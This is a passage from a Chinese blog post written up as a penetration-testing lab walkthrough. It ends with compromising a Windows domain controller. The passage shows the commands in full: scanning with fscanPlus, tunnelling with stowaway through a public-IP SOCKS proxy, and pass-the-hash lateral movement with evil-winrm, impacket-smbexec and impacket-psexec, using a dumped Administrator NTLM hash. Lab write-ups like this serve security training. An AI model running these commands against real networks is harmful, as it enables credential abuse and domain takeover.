open</span><br><span class="line">192.168.77.250:5985 open</span><br><span class="line">192.168.77.25:5985 open</span><br><span class="line">192.168.77.25:7001 open</span><br><span class="line">192.168.77.25:7201 open</span><br><span class="line">192.168.77.250:9389 open</span><br></pre></td></tr></table></figure>

<p>发现一台存活主机<code>192.168.77.250</code>:</p>
<p>对其再进行一波扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/Downloads/fscanPlus_amd64.exe -h 192.168.77.250 -o C:/Users/Public/Downloads/77_250.txt</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241212143443840.png" class="" title="image-20241212143443840">

<p>扫描结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">192.168.77.250:88 open</span><br><span class="line">192.168.77.250:135 open</span><br><span class="line">192.168.77.250:445 open</span><br><span class="line">192.168.77.250:139 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.77.250</span><br><span class="line">   [-&gt;]WIN-LAVRSND6J6N</span><br><span class="line">   [-&gt;]192.168.77.250</span><br><span class="line">[*] OsInfo 192.168.77.250	(Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[*] NetBios 192.168.77.250  [+] DC:WIN-LAVRSND6J6N.c3ting.org      Windows Server 2012 R2 Standard 9600</span><br></pre></td></tr></table></figure>

<p>梳理综合一下上述的一些重要信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DC：</span><br><span class="line">192.168.77.250</span><br><span class="line">WIN-LAVRSND6J6N.c3ting.org</span><br><span class="line"></span><br><span class="line">Username : Administrator</span><br><span class="line">Domain   : C3TING</span><br><span class="line">NTLM     : 7ab183888ecafcccf897c4a5a59c8568</span><br><span class="line">SHA1     : 65e4580b288c7c555e21f70d81dd6e0b72397ed9</span><br></pre></td></tr></table></figure>

<p>并且通过上述其开放的端口信息，我们可以直接通过：<code>5985</code>，<code>445</code>等端口直接打横向移动如下：</p>
<p>不过记得先想192.168.81.22机器上传一个stowaway工具搭建一个通向<code>192.168.77.0/24</code>网段的隧道</p>
<p>这里我直接将代理端口设置到公网ip的12345端口上：</p>
<p><code>socks5://公网ip:12345</code></p>
<p>5985端口PTH横向：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains evil-winrm -i WIN-LAVRSND6J6N.c3ting.org -u administrator -H 7ab183888ecafcccf897c4a5a59c8568</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241212144845152.png" class="" title="image-20241212144845152">

<p>成功横向。</p>
<p>445端口PTH横向：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-smbexec C3TING/administrator@192.168.77.250 -hashes :7ab183888ecafcccf897c4a5a59c8568</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241212151940050.png" class="" title="image-20241212151940050">

<p>或</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-psexec C3TING/administrator@192.168.77.250 -hashes :7ab183888ecafcccf897c4a5a59c8568</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241212151816120.png" class="" title="image-20241212151816120">

<p>至此成功拿下全部主机。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Iconabc.github.io">icon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://iconabc.github.io/posts/55d580db.html">https://iconabc.github.io/posts/55d580db.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Iconabc.github.io" target="_blank">icon'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">打靶记录</a></div><div class="post-share"><div class="social-share" data-image="/img/mbc.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/868e8d19.html" title="网络通信知识点小总"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">网络通信知识点小总</div></div><div class="info-2"><div class="info-item-1">网络通信防火墙概述： 什么是防火墙？  ​		防火墙是一款具有安全防护功能的网络设备。  防火墙的作用是什么?  访问控制，隔离网络，将需要保护的网络与不可信任的网络进行隔离，隐藏数据信息并做安全防护。  路由器不是隔离了网络么?  路由器隔离的是广播域或者网段，而不是网络。IP配好，路由配好即可全网互通，路由器默认没有任何限制。防火墙将网络分为可信任的区域和不可信任的区域，并且把可信任区域和不可信任区域分隔开。IP 配好，路由配好不能全网互通，默认情况下就会有限制。  路由器和防火墙的区别是什么?  路由器是3 层设备，防火墙是4&#x2F;5 层设备。防火墙具有路由转发的功能，并且还能做区域隔离和访问控制策略,比路由器贵。路由器做访问控制叫ACL，防火墙的叫访问策略。路由器ACL...</div></div></div></a><a class="pagination-related" href="/posts/388269d7.html" title="sqlmap常用命令"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">sqlmap常用命令</div></div><div class="info-2"><div class="info-item-1">sqlmap常见命令：工具Sqlmap简介：Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。一般Linux kali 系统自带的。 目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/a9057879.html" title="vulntarget-h靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="info-item-2">vulntarget-h靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-h:个人看了wp偏ctf，打下来就总体来说，挺难评，我认为是一个杀软靶场，加上一些技巧性的ctf题！ 思路：第一步信息收集过程，直接外网展示了一个sql injection basic的大字就差贴脸告诉你这是sql注入的考点了，并且给出了提示?user_id=....然后这里通过手测是有一个注入点的。  网站指纹 IIS的环境 端口扫描 对开放端口提供服务进行判断  经过扫描发现后端是”asp“ ,所以其一般配套会搭sql...</div></div></div></a><a class="pagination-related" href="/posts/3e9a6950.html" title="vulntarget-j靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-15</div><div class="info-item-2">vulntarget-j靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-j打靶记录：拓朴图如下：   1.第一层：1.1信息收集：使用一系列扫描工具都可以进行初步的发现工作，nmap，tscanplus等，我用后者： 扫出如下端口开放：   有一些指纹信息但我才疏学浅，还需要进一步进行测试！ 指纹识别一手：   打开如下几个端口开放站点：  http://192.168.189.138:80/  80端口是fastadmin的框架   我搜索了这个框架的诸多历史漏洞都没能成功利用，选择对其他开放端口进行进一步的探索。 原因：可能是因为其后台可能已经不是默认路径了，决定尝试从旁站打   http://192.168.189.138:7001/  7001端口对其进行目录扫描工作：      查询状态码是200，301的路径：有如下有信息回显：   发现了：Kindeditor 直接访问默认http:*//192.168.189.138:7001/kindeditor.js*   得知其kindeditor版本：version 3.5.5  存在目录遍历漏洞：KindEditor...</div></div></div></a><a class="pagination-related" href="/posts/98ed62e4.html" title="vulntarget-k靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-19</div><div class="info-item-2">vulntarget-k靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-k打靶记录：正式wp：https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 账号密码信息：    主机 主机账号密码 web账号密码    xxl-job-admin xxl-job&#x2F;root123 admin&#x2F;Bolean@10000   nacos-springcloudgateway spring-nacos&#x2F;root123 nacos&#x2F;bolean@1q2   redis redis&#x2F;redis@1z redis密码：nbsg@123456   拓扑图：   思路：其中外网IP我设置成了：192.168.189.130 网络配置文件为：/etc/netplan/00-installer-config.yaml 123456789101112131415161718network:  ethernets:    ens33:      addresses:      - 192.168.189.130/24      gateway4:...</div></div></div></a><a class="pagination-related" href="/posts/23837ad8.html" title="HTB-Driver"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-22</div><div class="info-item-2">HTB-Driver</div></div><div class="info-2"><div class="info-item-1">HTB-Driver:机器简介：Driver 是一台简单的 Windows 机器，专注于打印机开发。对机器的枚举显示，Web 服务器正在监听端口 80，同时 SMB 正在监听端口 445，WinRM 正在监听端口 5985。导航到该网站显示，它使用基本 HTTP 身份验证受到保护。在尝试常用凭据时，admin:admin 凭据被接受，因此我们能够访问该网页。该网页提供了一项功能，可以将打印机固件上传到 SMB 共享上，以供远程团队进行测试和验证。上传包含从本地机器获取远程文件的命令的 Shell 命令文件会导致用户 tony 的 NTLM 哈希被转发回给我们。破解捕获的哈希以检索纯文本密码，我们能够使用 WinRM 以 tony 身份登录。然后，切换到 meterpreter 会话，发现该机器容易受到本地特权攻击，该攻击会滥用远程机器上存在的特定打印机驱动程序。利用该漏洞，我们可以获得“NT...</div></div></div></a><a class="pagination-related" href="/posts/4f0d5716.html" title="Kerberos-认证原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-24</div><div class="info-item-2">Kerberos-认证原理</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/4a17b156.html" title="vulntarget-i靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-11</div><div class="info-item-2">vulntarget-i靶场</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/mbc.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">icon</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Iconabc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iconabc/" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:2899345299@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">up up</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wuxian%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95%E2%80%94%E6%9C%88%E6%8C%91%E6%88%98"><span class="toc-number">1.</span> <span class="toc-text">wuxian打靶记录—月挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E6%9C%BA%E5%99%A810-10-0-3"><span class="toc-number">1.1.</span> <span class="toc-text">入口机器10.10.0.3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#10-10-0-3-%E7%A7%AF%E6%9C%A8%E6%8A%A5%E8%A1%A8-SSTI%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">10.10.0.3-积木报表 SSTI：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-10-0-3-Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.2.</span> <span class="toc-text">10.10.0.3-Shiro 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-80-50-Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">1.1.3.</span> <span class="toc-text">192.168.80.50-Docker容器逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-80-55-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95WAF"><span class="toc-number">1.1.4.</span> <span class="toc-text">192.168.80.55-文件上传绕WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-81-22-weblogic"><span class="toc-number">1.1.5.</span> <span class="toc-text">192.168.81.22-weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-77-250-PTH%E6%A8%AA%E5%90%91"><span class="toc-number">1.1.6.</span> <span class="toc-text">192.168.77.250-PTH横向</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/111fe729.html" title="04-Win32编程">04-Win32编程</a><time datetime="2025-01-14T10:35:28.000Z" title="发表于 2025-01-14 18:35:28">2025-01-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/cc605c90.html" title="03-C/C++软件逆向技术">03-C/C++软件逆向技术</a><time datetime="2025-01-11T13:52:21.000Z" title="发表于 2025-01-11 21:52:21">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/be4abe2b.html" title="02-x86_64架构汇编语言">02-x86_64架构汇编语言</a><time datetime="2024-12-26T08:44:51.000Z" title="发表于 2024-12-26 16:44:51">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/e11d0610.html" title="01-C++基础学习">01-C++基础学习</a><time datetime="2024-12-22T01:59:42.000Z" title="发表于 2024-12-22 09:59:42">2024-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ad068c24.html" title="多级代理工具">多级代理工具</a><time datetime="2024-12-18T12:33:28.000Z" title="发表于 2024-12-18 20:33:28">2024-12-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/shuai.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By icon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="/">icon</a> is striving to become stronger!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo

  const disqusReset = conf => {
    window.DISQUS && window.DISQUS.reset({
      reload: true,
      config: conf
    })
  }

  const loadDisqus = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyDisqus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    window.disqus_identifier = isShuoshuo ? path : '/posts/55d580db.html'
    window.disqus_url = isShuoshuo ? location.origin + path : 'https://iconabc.github.io/posts/55d580db.html'

    const disqus_config = function () {
      this.page.url = disqus_url
      this.page.identifier = disqus_identifier
      this.page.title = 'wuxiang月挑战one'
    }

    if (window.DISQUS) disqusReset(disqus_config)
    else {
      const script = document.createElement('script')
      script.src = 'https://.disqus.com/embed.js'
      script.setAttribute('data-timestamp', +new Date())
      document.head.appendChild(script)
    }

    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
  }

  const getCount = async() => {
    try {
      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
      if (!eleGroup) return
      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')

      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
        method: 'GET'
      })
      const result = await res.json()

      const count = result.response.length ? result.response[0].posts : 0
      eleGroup.textContent = count
    } catch (err) {
      console.error(err)
    }
  }

  if (isShuoshuo) {
    'Disqus' === 'Disqus'
      ? window.shuoshuoComment = { loadComment: loadDisqus }
      : window.loadOtherComment = loadDisqus
    return
  }

  if ('Disqus' === 'Disqus' || !false) {
    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
    else {
      loadDisqus()
      
    }
  } else {
    window.loadOtherComment = loadDisqus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>